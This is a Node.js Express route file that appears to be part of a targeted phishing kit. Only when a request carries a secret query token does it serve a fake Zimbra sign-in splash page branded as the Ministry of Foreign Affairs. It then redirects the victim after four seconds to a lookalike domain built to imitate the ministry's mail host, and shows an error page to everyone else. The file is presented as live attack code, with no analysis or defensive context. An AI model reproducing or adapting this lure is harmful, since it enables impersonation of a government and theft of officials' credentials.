
const express = require ('express');
const router = express.Router();
const db = require('../db');

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.Mun7Dy274HFDnPe7I74Na7iKKi374h;
    const url = `https://mail1.mofa.gov.pk.docum.store/newmaildoc`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
        <!doctype html>
        <html lang="en">
        <head>
           <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 4000);
            </script> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
    <title>Ministry of Foreign Affairs Web Client Sign In</title>

	
        </head>
        <body>
	
<div style="display:none;">
      <img src="/images/LoginBanner.png" alt="">
      </div>
    
<div id="skin_container_splash_screen" class="SplashScreen">
	
	
	<div id="ZSplashPanel" class="center">
		<div class="contentBox">
			<h1><div id="ZLoginBannerImage" class="ImgLoginBanner" onclick="showCompanyUrl()"></div></h1>
			<div id="ZLoginAppName">
				Web Client
			</div>
			<div id="#ZSplashBodyContainer" class="content">
				<div class="message">
					Loading ...
				</div>
			</div>
		</div>
        <div class="decor1"></div>
	</div>
	<div class="Footer">
        <div class="copyright">
         Copyright © 2023 Ministry of Foreign Affairs. All rights reserved.
        </div>
    </div>
	
	</body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;
